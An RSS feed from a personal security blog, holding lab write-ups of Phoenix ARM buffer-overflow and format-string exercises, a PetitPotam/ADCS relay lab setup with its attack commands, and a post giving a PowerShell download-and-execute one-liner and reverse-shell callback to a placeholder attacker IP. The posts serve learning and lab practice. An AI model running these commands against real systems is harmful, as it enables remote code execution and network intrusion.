<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Andr01ds Blog</title>
    <link>https://rtandr01d.net/posts/</link>
    <description>Recent content in Posts on Andr01ds Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 19 Jun 2023 22:34:07 -0500</lastBuildDate>
    
	<atom:link href="https://rtandr01d.net/posts/index.xml" rel="self" type="application/rss+xml" />
    
    
    
    <item>
      <title>Phoenix ARM Format Zero</title>
      <link>https://rtandr01d.net/posts/phoenix-arm-format-zero/</link>
      <pubDate>Mon, 19 Jun 2023 22:34:07 -0500</pubDate>
      
      <guid>https://rtandr01d.net/posts/phoenix-arm-format-zero/</guid>
      <description>&lt;p&gt;Now that I have rounded off the stack challenges, now I will move on to the Format Strings challenges. Format Strings is a vulnerability where the input of the user is not santizied for special characters correctly, allowing the input to be a &amp;ldquo;format&amp;rdquo; string telling the program what kind of string should be returned. This can create situations where the user can read or modify memory.&lt;/p&gt;
&lt;p&gt;In the first challenge, the objective is simply to change a variable which the user does not have direct control over. Taking a look at the source code, we can see there is an &amp;lsquo;sprintf&amp;rsquo; call which attempts to print the contents of buffer into locals.dest.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/formatzerosource.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Within the locals struct, we can see the char buffer dest and integer changeme. We want to overwrite changeme, and we have 32 characters to fill the dest buffer with before we can do this. However, our input buffer is only 16 characters long. How can we overcome this?&lt;/p&gt;
&lt;p&gt;As I mentioned before, a format strings vulnerability allows for us to tell the program what format of input we are trying to supply. Due to this issue, we can provide input which, when interpreted by the machine, will fill the dest buffer (during the sprintf) with information of the size we are providing.&lt;/p&gt;
&lt;p&gt;In this example, I decided to use the &amp;ldquo;%x&amp;rdquo; format. I can only provide up to 16 of these, however each %x will fill 8 bytes of the dest buffer, thus providing the overflow to change the changeme variable.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/formatzerosuccess.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Success.&lt;/p&gt;
</description>
    </item>
    
    
    
    <item>
      <title>Phoenix ARM Stack Five</title>
      <link>https://rtandr01d.net/posts/phoenix-arm-stack-five/</link>
      <pubDate>Thu, 04 May 2023 13:45:20 -0500</pubDate>
      
      <guid>https://rtandr01d.net/posts/phoenix-arm-stack-five/</guid>
      <description>&lt;p&gt;Stack five take our exploits to the next step. While we can fill a buffer and achieve a buffer overflow, this time we want to execute shellcode which we provide as part of the exploit. Lets take a look at our source code.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfivesource.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can see the main function prints the banner and runs the start_level() function. This function uses the well-known &amp;lsquo;gets&amp;rsquo; function, and puts the user&amp;rsquo;s input into &amp;lsquo;buffer&amp;rsquo;. The buffer is 128 characters long, so our PoC should be close to this length. Filling the buffer with the right amount of chars, we should see a segmentation fault.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfiveinitialsegfault.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;In gdb, we can disassemble start_level and insert a breakpoint right after gets to take a look at what is happening with our input and registers.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfivestartleveldisass.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;In start_level, our buffer is put into $r11-132, which is 0xfffef640. Knowing that we are overflowing our buffer, and that we know where the buffer is being put, we could control the program execution to land on our own shellcode! Lets find out where we are overflowing with the buffer to determine where we can control the execution.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfivecyclic.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfiveillegalinstruction.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;We get an Illegal instruciton error. $R11 is set to &amp;ldquo;haab&amp;rdquo;, and if we take a look at the main function, we can see $PC is popped to $R11. This means &amp;ldquo;haab&amp;rdquo; is the program counter giving us the position we can start controlling the flow of the program. The next thing to handle is where to direct the program. Even through we have the address of the beginning of our stack, it is common to use a NOP sled for our shellcode to be executed properly.&lt;/p&gt;
&lt;p&gt;I have created the following program to set up our payload, including the NOP sled, the shellcode (in this case runing /bin/dash), the rest of the buffer and the address of where I want the program execution to land. I give an address that is a bit after the beginning of our buffer, as if I attempted to start at the beginning of the buffer, the program would not continue execution.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfiveexploitcode.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Getting this input to be accepted by the program was quite dificult. I am still not entirely sure I understand why it must be done in this way, however here is the process. Keep in mind, this is python2.7 as strings are handled differently in python3&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfivepython.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Success!&lt;/p&gt;
</description>
    </item>
    
    
    
    <item>
      <title>Phoenix ARM Stack Four</title>
      <link>https://rtandr01d.net/posts/phoenix-arm-stack-four/</link>
      <pubDate>Thu, 04 May 2023 13:45:17 -0500</pubDate>
      
      <guid>https://rtandr01d.net/posts/phoenix-arm-stack-four/</guid>
      <description>&lt;p&gt;Stack four carries the same idea s stack three where we want to control the program&amp;rsquo;s next execution. But instead of using a function pointer which the program had defined (therefore existed just beyod our buffer on the stack), we are trying to control the program counter ($pc).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfoursource.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;This means we need to fill our buffer enough to control the $pc register. To do this, we can use pwntools to create a string long enough to fill our buffer and then some, and find where $pc is being filled with this buffer.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfourpwncyclic.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Once we have our string, we can run the binary with gdb and provide the string as inpug.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfourgdb.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can see that $pc is filled with 0x61616174 or &amp;ldquo;taaa&amp;rdquo;. To figure out where this lies in our buffer, we can use pwntools once again. Keep in mind that because of ARM and THUMB mode (discussed two paragraphs down), we will need to add 4 bytes to the result here.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfourpwntaaa.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now that we have our buffer length, we need to find the address we want $pc to point to. As with stack three, there is a function called complete_level that we will want to jump to. In gdb, we get the address using the &amp;lsquo;info functions&amp;rsquo; command.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfourinfofunctions.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Once we have our buffer lenth and our address we want $pc to jump to, we can create our exploit.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackfourexploit.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;We could run into an issue here. Arm has two addressing modes - Thumb Mode and Arm Mode. The Thumb instruction set conists of 16-bit instructions compared to the standard 32-bit instructions of ARM mode. The choice between these two modes is decided using the Least Significant Bit of our Prgram Counter register. As an example, if we overflow our buffer and provide $pc with the address &amp;lsquo;0x00010545&amp;rsquo;, $pc will instead continue past our input and exit the function as the LSB of the address is an odd number, telling the processor to take 16 bit instructions.&lt;/p&gt;
&lt;p&gt;Luckliy, however, the address we are jumping to has an address ending in an even number, meaning the program will branch to the &amp;lsquo;complete_level&amp;rsquo; function.&lt;/p&gt;
&lt;p&gt;Success!&lt;/p&gt;
</description>
    </item>
    
    
    
    <item>
      <title>Phoenix ARM Stack Three</title>
      <link>https://rtandr01d.net/posts/phoenix-arm-stack-three/</link>
      <pubDate>Thu, 04 May 2023 13:45:11 -0500</pubDate>
      
      <guid>https://rtandr01d.net/posts/phoenix-arm-stack-three/</guid>
      <description>&lt;p&gt;In previous challenges, the purpose of overflowing the buffer and changing a variable was to meet a condition which checked that the variable had changed at all. Looking at the source code for stack-three, we can see the variable we are overwriting happens to be a function pointer. Notice there is a function called &amp;lsquo;complete_level&amp;rsquo; which will be helpful when we overwrite the function pointer.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackthreesource.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;We know we can keep the 64 character buffer to achieve the overflow, but how can we know the address of the &amp;lsquo;complete_level&amp;rsquo; function? Running gdb we can see the address of all functions within this binary using the &amp;lsquo;info functions&amp;rsquo; command.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackthreeinfofunctions.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Once we know the address of our target function, we can include this address after our buffer to direct the function pointer to the function.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackthreeexploit.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;We have success.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackthreesuccess.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    
    
    <item>
      <title>Phoenix ARM Stack Two</title>
      <link>https://rtandr01d.net/posts/phoenix-arm-stack-two/</link>
      <pubDate>Wed, 26 Apr 2023 16:30:36 -0500</pubDate>
      
      <guid>https://rtandr01d.net/posts/phoenix-arm-stack-two/</guid>
      <description>&lt;h1 id=&#34;stack-two&#34;&gt;Stack Two&lt;/h1&gt;
&lt;p&gt;Stack two is similar to the stack one, however this binary will take a environment variable as the string. If we take a look at the source code, we can see there is a check for the environment variable before copying the string in environment variable over, meaning we cannot continue with the exploit without atleast setting the variable.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stacktwosource.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can also see this in the branch instruction to getenv within the main function:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/as_getenv.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Next the program checks for a hex value &lt;code&gt;0x0d0a090a&lt;/code&gt; in the &lt;code&gt;changeme&lt;/code&gt; variable. Once again we can overflow our 64 byte buffer and include the value at the end of the buffer to complete this level.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stacktwoexploit.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stacktwosuccess.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    
    
    <item>
      <title>Phoenix ARM Stack One</title>
      <link>https://rtandr01d.net/posts/phoenix-arm-stack-one/</link>
      <pubDate>Mon, 17 Apr 2023 23:33:24 -0500</pubDate>
      
      <guid>https://rtandr01d.net/posts/phoenix-arm-stack-one/</guid>
      <description>&lt;h1 id=&#34;stack-one&#34;&gt;Stack one&lt;/h1&gt;
&lt;p&gt;Stack one is very similar to stack zero with a buffer overflow, however the objective is to insert a certain value into &lt;code&gt;locales.changeme&lt;/code&gt;. We see in the source code that the new comparrison for &lt;code&gt;locals.changeme&lt;/code&gt; is for the value &lt;code&gt;0x496c5962&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackonesource.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can decode this hex value to be &lt;code&gt;IlYb&lt;/code&gt;. Since ARM is little-endian, when we try to set the value here, we will need to reverse the string as when the value will be read, it will be interpreted in reverse order.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackoneexploit.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;And we get success.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackonesuccess.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    
    
    <item>
      <title>Phoenix ARM Stack Zero</title>
      <link>https://rtandr01d.net/posts/phoenix-arm-stack-zero/</link>
      <pubDate>Mon, 17 Apr 2023 23:22:19 -0500</pubDate>
      
      <guid>https://rtandr01d.net/posts/phoenix-arm-stack-zero/</guid>
      <description>&lt;p&gt;I realize writing up every Protostar/Phoenix exercise has been done a million times over, but this is for my own notes and to track my progress.&lt;/p&gt;
&lt;p&gt;Stack Zero is a classic buffer overflow. With the source code handy, we can see there is a buffer of 64 characters and the method gets is used:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/stackzerosources.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Once &lt;code&gt;locals.changeme&lt;/code&gt; is set to anything other than 1, we get a success. This is easy to accomplish via printing 65 A&amp;rsquo;s and providing them as input:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/exploit.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;And we get a success:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/success.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    
    
    <item>
      <title>Setting Up A Petit Potam Lab</title>
      <link>https://rtandr01d.net/posts/petitpotam_lab/</link>
      <pubDate>Fri, 14 Apr 2023 01:51:15 -0500</pubDate>
      
      <guid>https://rtandr01d.net/posts/petitpotam_lab/</guid>
      <description>&lt;p&gt;The PetitPotam vulnerability has been around for quite some time now, but there is frighteningly little
information on how to set up this attack as a lab. There is a decent writeup on it over on DirkJanm&amp;rsquo;s
page however his setup relies on using delegation to set up up a new machine to the domain. My idea
of a good lab setup for PetitPotam is relaying the machine account of our vulnerable target to the ADCS
server and creating a CSR for that machine account.&lt;/p&gt;
&lt;p&gt;In order to set up this lab, we need an Active Directory domain consisting of one Domain Controller
(the PetitPotam vulnerable machine) and an ADCS server with CA and Certificate Web Enrollment Services
installed. This service is used in a domain to request SSL certificates for use on applications
like web servers or remote management services. The Windows Server version I am running is 2016
without patches installed. The patch which fixed PetitPotam is KB500543, so as long as you dont
have this update, the server should be vulnerable.&lt;/p&gt;
&lt;p&gt;Once you have the Domain Controller setup and the ADCS server installed and setup with Certificate
Web Enrollment Services, to see the certificates that have been generated, open Control Panel -&amp;gt;
Administrative Tools -&amp;gt; Certificate Authority and click on Issued Certificates. You should see
the machine account certificate for the Domain Controller.&lt;/p&gt;
&lt;p&gt;Note: It is not neccessary to generate a certificate for the Domain Controller for this attack.
I added this purely for informational purposes on setting up automatic enrollment.&lt;/p&gt;
&lt;p&gt;If you need to generate a certificate, we can enroll the Domain Controller with Auto-Enroll. On your
Domain Controller, open Local Group Policy Editor and open Windows Settings -&amp;gt; Security Settings
and select Public Key Policies:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/localgroupolicy.png&#34; alt=&#34;image info&#34; title=&#34;Local Group Policy&#34;&gt;&lt;/p&gt;
&lt;p&gt;Right-click on Certificate Services Client - Auto-Enrollment and select Enabled from the drop down.
Be sure to also check the two boxes for renewing and updating certificates:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/certificateenrollment.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Once you have the certificate generated, you should double check that the Web Service was created
correctly, you can navigate to &lt;a href=&#34;http://adcshostname.domain/certsrv&#34;&gt;http://adcshostname.domain/certsrv&lt;/a&gt; (where adcshostname is the hostname
of your ADCS server)and it should ask for authentication. Once you have verrified, you should be able
to perform your attack. I typically use this along with impacket&amp;rsquo;s ntlmrelayx.&lt;/p&gt;
&lt;p&gt;The format for the PetitPotam script is the following:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python3 PetitPotam.py attacker_ip domain_controller_ip&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The format for ntlmrelayx to request the Certificate Signing Request:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ntlmrelayx -smb2support --target http://adcs_hostname.domain/certsrv/certfnsh.asp --adcs --template KerberosAuthentication&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It should be noted that I have only successfully performed this attack using the hostname of the ADCS
server, so be sure to use the Domain&amp;rsquo;s DNS server (usually the Domain Controller) on your attack machine.
If we attempt this attack without a template, we get an error that we could not retrieve the certificate:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/certificateerror.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;This is because we have certain certificate types allowed on the domain! (this hung me up for quite some
time). We can see the certificate types enabled via the Certificate Authority tool found in the Tools
dropdown of Server Manager and selecting Certificate Templates:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/certificatetemplates.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Knowing what type of certificates are allowed, we can use the Kerberos Authentication or Domain Controller
template for our certificate. This may take some guesswork on a blind pentest, but is doable. If all is
correct, your ntlmrelayx session should output a generated Certificate Signing Request from the ADCS server
for your PetitPotam vulnerable Domain Controller:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rtandr01d.net/posts/images/output.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    
    
    <item>
      <title>Powershell Reverse Shell via IEX</title>
      <link>https://rtandr01d.net/posts/posh_reverse/</link>
      <pubDate>Fri, 14 Apr 2023 01:44:44 -0500</pubDate>
      
      <guid>https://rtandr01d.net/posts/posh_reverse/</guid>
      <description>&lt;p&gt;When you ware working in a Windows environment, whether Active Directory is involved or not,
there will come a time when you need a reverse shell, and most reverse shells from Pentest Monkey
arent going to work in your situation. Gaining RCE on a Windows box typically means you have access
to either cmd or Powershell. Getting a reliable shell can give some trouble, but luckily, Powershell
has the ability to call and run Powershell scripts remotely without dropping anything on disk.
First, we need a powershell reverse-tcp script. Luckily, samratashok on github has Invoke-PowerShellTCP.ps1
For this to work well, we need to add a line to the end of the powershell script. For example:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Invoke-PowerShellTcp -Reverse -IPAddress X.X.X.X -Port 4444&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;where ‘X.X.X.X’ is the IP address for the reverse shell to connect to. In order for our
target machine to be able to grab our Powershell script, we need to start up a webserver. I am partial
to using the easy python webserver, so we start it up using:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python -m SimpleHTTPServer 80&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We will need a listener on our local machine for the reverse shell to connect back to, so lets start up
a netcat listener:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netcat -lnvp 4444&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Next, we need to call this powershell script from our RCE on the Windows box. To call this script remotely,
we need to run this on the Windows machine:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;powershell.exe -exec bypass iex(New-Object Net.WebClient).DownloadString(‘http://X.X.X.X/InvokePowerShellTcp.ps1&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;If we are lucky, this will now throw a reverse Powershell instance back to our netcat listener&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:~# nc -lnvp 4444
listening on [any] 4444
connecting to [X.X.X.X] from (UNKNOWN) [X.X.X.X] 47907
Windows PowerShell running as user MS01$ on MS01 Copyright © 2015 Microsoft Corporation. All right reserved.
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    
  </channel>
</rss>
